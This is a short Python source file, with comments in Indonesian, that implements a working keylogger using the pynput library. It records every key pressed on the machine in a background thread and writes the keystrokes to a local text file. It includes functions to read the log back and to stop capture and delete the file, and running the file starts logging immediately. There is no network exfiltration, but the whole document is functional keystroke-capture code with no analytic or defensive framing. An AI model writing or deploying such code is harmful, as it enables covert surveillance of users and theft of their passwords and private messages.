from pynput.keyboard import Listener
import threading
import re
import os

class KeyLogger:
    def __init__(self):
        self.tombol = []
        self.hitung = 0
        self.path = 'log_data.txt'
        self.listener = None  # Tambahkan inisialisasi listener

    def start_listener(self):
        self.listener = Listener(on_press=self.key_pressed)
        self.listener.start()
        self.listener.join()

    def start_logger(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        self.tombol.append(key)
        self.hitung += 1
        
        if self.hitung >= 1:
            self.hitung = 0
            with open(self.path, 'a') as file:
                for i in self.tombol:
                    i = re.sub("'", "", str(i))
                    if i == "Key.enter":
                        file.write("\n") 
                    elif i in ("Key.shift", "Key.shift_r", "Key.ctrl", "Key.escape"): 
                        pass 
                    elif i == "Key.backspace":
                        file.write(" [backspace] ") 
                    elif i == "Key.space":
                        file.write(" ") 
                    elif i == "Key.tab":
                        file.write(" [Tab] ") 
                    elif i == "Key.caps_lock":
                        file.write(" [Capslock]") 
                    else: 
                        file.write(i)
            self.tombol = []
    
    def read_log(self): 
        if os.path.exists(self.path):
            with open(self.path, 'r') as file:
                return file.read()
        return "Log file not found."

    def stop_listener(self):
        if self.listener:  # Cek apakah listener ada sebelum memanggil stop
            self.listener.stop()
            self.listener = None  # Reset listener setelah dihentikan
        
        if os.path.exists(self.path):  # Cek sebelum menghapus
            os.remove(self.path)

if __name__ == "__main__":
    KeyLogger().start_logger()
